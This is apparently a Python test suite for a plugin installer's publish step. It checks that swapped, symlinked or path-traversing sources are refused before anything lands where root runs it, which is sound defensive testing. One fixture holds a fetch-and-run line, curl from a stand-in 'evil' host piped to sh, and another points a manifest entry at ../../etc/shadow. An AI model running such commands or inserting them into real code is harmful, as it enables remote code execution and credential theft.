"""The strict install must not publish bytes it did not verify.

The install reads its sources out of the plugin checkout, and the checkout is
writable without root. The question these tests answer is the one a reviewer
asked: if something replaces a source after the user has agreed to the
install, do the substituted bytes end up where root will run them?

Each test builds a small checkout, lets the manifest be read the way the
installer reads it, swaps a file behind its back, and then checks what
publish() actually wrote.
"""

from __future__ import annotations

import hashlib
import importlib.util
import os
import shutil
import stat
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
PUBLISH = os.path.join(os.path.dirname(HERE), "bin", "screen-time-publish")


def load_publisher():
    # The publisher has no .py suffix, being a script people run.
    spec = importlib.util.spec_from_loader(
        "screen_time_publish",
        importlib.machinery.SourceFileLoader("screen_time_publish", PUBLISH),
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


publisher = load_publisher()

DAEMON = b"#!/usr/bin/env python3\nprint('the reviewed daemon')\n"
MODULE = b"VALUE = 'reviewed'\n"
UNIT = b"[Service]\nExecStart=@BINDIR@/omarchy-screen-timed\n"
SUBSTITUTED = b"#!/usr/bin/env python3\nimport os\nos.system('curl evil|sh')\n"


class PublishTest(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="screen-time-publish-test.")
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        self.here = os.path.join(self.root, "checkout")
        self.libdir = os.path.join(self.root, "lib")
        self.unit = os.path.join(self.root, "omarchy-screen-time.service")

        os.makedirs(os.path.join(self.here, "bin"))
        os.makedirs(os.path.join(self.here, "screen_time"))
        os.makedirs(os.path.join(self.here, "systemd"))
        self.write("bin/omarchy-screen-timed", DAEMON)
        self.write("screen_time/__init__.py", MODULE)
        self.write("systemd/omarchy-screen-time-system.service", UNIT)
        self.write_manifest()

    # -- helpers ---------------------------------------------------------
    def write(self, relpath, data):
        full = os.path.join(self.here, relpath)
        with open(full, "wb") as handle:
            handle.write(data)
        return full

    def write_manifest(self, **override):
        lines = []
        for relpath in (
            "bin/omarchy-screen-timed",
            "systemd/omarchy-screen-time-system.service",
            "screen_time/__init__.py",
        ):
            if relpath in override:
                digest = override[relpath]
            else:
                with open(os.path.join(self.here, relpath), "rb") as handle:
                    digest = hashlib.sha256(handle.read()).hexdigest()
            lines.append(f"{digest}  {relpath}\n")
        self.write("MANIFEST.sha256", "".join(lines).encode())

    def publish(self):
        payload = publisher.collect(self.here)
        return publisher.publish(payload, self.libdir, self.unit)

    def installed_daemon(self):
        target = os.path.join(self.libdir, "bin", "omarchy-screen-timed")
        if not os.path.exists(target):
            return None
        with open(target, "rb") as handle:
            return handle.read()

    # -- the regression the reviewer asked for ---------------------------
    def test_source_swapped_after_the_check_is_not_installed(self):
        """The manifest is read, then the daemon is replaced. Nothing lands."""
        # The user-side check: the installer has read the manifest and shown
        # what it covers, and the user has said yes.
        with open(os.path.join(self.here, "MANIFEST.sha256"), "rb") as handle:
            self.assertIn(b"bin/omarchy-screen-timed", handle.read())

        # Something in the user's session replaces the daemon behind its back.
        self.write("bin/omarchy-screen-timed", SUBSTITUTED)

        with self.assertRaises(publisher.Refused) as caught:
            self.publish()
        self.assertIn("not the reviewed file", str(caught.exception))
        self.assertIsNone(self.installed_daemon())
        self.assertFalse(os.path.exists(self.unit))

    def test_a_swapped_module_stops_the_whole_publish(self):
        """One bad file publishes nothing at all, not everything but that one."""
        self.write("screen_time/__init__.py", b"VALUE = 'substituted'\n")

        with self.assertRaises(publisher.Refused):
            self.publish()
        # The daemon sorts before the module, so a publisher that wrote as it
        # went would already have installed it by the time it noticed.
        self.assertIsNone(self.installed_daemon())

    def test_a_swapped_unit_is_refused(self):
        """The unit runs as root too, so it is covered like the daemon."""
        self.write(
            "systemd/omarchy-screen-time-system.service",
            b"[Service]\nExecStart=/tmp/anything\n",
        )
        with self.assertRaises(publisher.Refused):
            self.publish()
        self.assertFalse(os.path.exists(self.unit))

    def test_a_symlinked_source_is_refused(self):
        """A symlink swapped in must not be followed out of the checkout."""
        elsewhere = os.path.join(self.root, "elsewhere")
        with open(elsewhere, "wb") as handle:
            handle.write(SUBSTITUTED)
        target = os.path.join(self.here, "bin", "omarchy-screen-timed")
        os.unlink(target)
        os.symlink(elsewhere, target)

        with self.assertRaises(publisher.Refused) as caught:
            self.publish()
        self.assertIn("omarchy-screen-timed", str(caught.exception))
        self.assertIsNone(self.installed_daemon())

    def test_a_symlinked_directory_is_refused(self):
        """Every component is opened with O_NOFOLLOW, not only the last one."""
        elsewhere = os.path.join(self.root, "otherbin")
        os.makedirs(elsewhere)
        with open(os.path.join(elsewhere, "omarchy-screen-timed"), "wb") as handle:
            handle.write(SUBSTITUTED)
        shutil.rmtree(os.path.join(self.here, "bin"))
        os.symlink(elsewhere, os.path.join(self.here, "bin"))

        with self.assertRaises(publisher.Refused):
            self.publish()
        self.assertIsNone(self.installed_daemon())

    def test_a_manifest_path_cannot_leave_the_checkout(self):
        self.write(
            "MANIFEST.sha256",
            b"%s  ../../etc/shadow\n" % (b"0" * 64),
        )
        with self.assertRaises(publisher.Refused) as caught:
            self.publish()
        self.assertIn("leaves the checkout", str(caught.exception))

    # -- and the install still has to work -------------------------------
    def test_an_untouched_checkout_publishes(self):
        self.publish()
        self.assertEqual(self.installed_daemon(), DAEMON)

        daemon = os.path.join(self.libdir, "bin", "omarchy-screen-timed")
        self.assertEqual(stat.S_IMODE(os.stat(daemon).st_mode), 0o755)
        module = os.path.join(self.libdir, "screen_time", "__init__.py")
        self.assertEqual(stat.S_IMODE(os.stat(module).st_mode), 0o644)

        with open(self.unit, "rb") as handle:
            written = handle.read()
        self.assertIn(os.path.join(self.libdir, "bin").encode(), written)
        self.assertNotIn(b"@BINDIR@", written)

    def test_a_stale_module_is_removed(self):
        """An older version's module would still be importable by the daemon."""
        self.publish()
        stale = os.path.join(self.libdir, "screen_time", "gone.py")
        with open(stale, "wb") as handle:
            handle.write(b"VALUE = 'from an older install'\n")

        self.publish()
        self.assertFalse(os.path.exists(stale))
        self.assertTrue(
            os.path.exists(os.path.join(self.libdir, "screen_time", "__init__.py"))
        )

    def test_a_manifest_that_covers_nothing_useful_is_refused(self):
        self.write("MANIFEST.sha256", b"")
        with self.assertRaises(publisher.Refused):
            self.publish()


if __name__ == "__main__":
    unittest.main()
